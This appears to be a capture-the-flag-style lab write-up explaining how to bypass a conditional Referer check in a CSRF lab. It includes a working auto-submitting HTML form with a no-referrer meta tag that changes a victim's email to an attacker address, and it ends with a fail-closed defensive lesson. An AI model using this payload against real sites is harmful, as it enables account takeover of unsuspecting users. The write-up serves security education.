# Lab 11: CSRF where Referer validation depends on header being present

**Difficulty:** Practitioner

## Goal

Change the victim's email with a CSRF attack. The server validates the `Referer` header against its own domain, but only when the header is present.

## Exploit

Suppress the `Referer` header entirely with a referrer policy, so the conditional check never runs.

```html
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
```

## Why it works

The check is conditional: the server validates the Referer only if the header exists. `<meta name="referrer" content="no-referrer">` tells the browser to send no `Referer` on outgoing requests. With no header present, validation is skipped and the CSRF succeeds.

Confirmed in Repeater: a valid Referer is accepted, a foreign Referer is rejected, and removing the Referer entirely is accepted.

## Takeaway

Like conditional token checks, Referer validation must fail closed. "Validate the Referer if it's there" means an attacker simply strips it. A missing Referer should be rejected, not trusted.
